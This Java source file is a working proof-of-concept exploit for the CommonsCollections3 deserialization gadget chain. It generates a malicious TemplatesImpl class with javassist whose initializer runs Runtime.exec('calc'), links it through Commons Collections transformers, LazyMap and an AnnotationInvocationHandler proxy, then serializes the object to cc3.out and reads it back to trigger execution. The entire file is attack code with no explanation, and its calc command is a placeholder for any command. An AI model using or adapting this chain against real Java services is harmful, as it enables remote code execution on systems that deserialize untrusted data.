import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3 {
    public static void main(String[] args) throws Exception {
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsCollections333333333");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");

        byte[] bytes=payload.toBytecode();

        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();
        Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templatesImpl,new byte[][]{bytes});

        Field field1=templatesImpl.getClass().getDeclaredField("_name");
        field1.setAccessible(true);
        field1.set(templatesImpl,"test");


        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})
        };

        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        Map map=new HashMap();
        Map lazyMap= LazyMap.decorate(map,chainedTransformer);

        Class cls=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);

        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap);
        Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);
        Object object=constructor.newInstance(Override.class,map1);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc3.out"));
        outputStream.writeObject(object);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("cc3.out"));
        inputStream.readObject();
    }
}
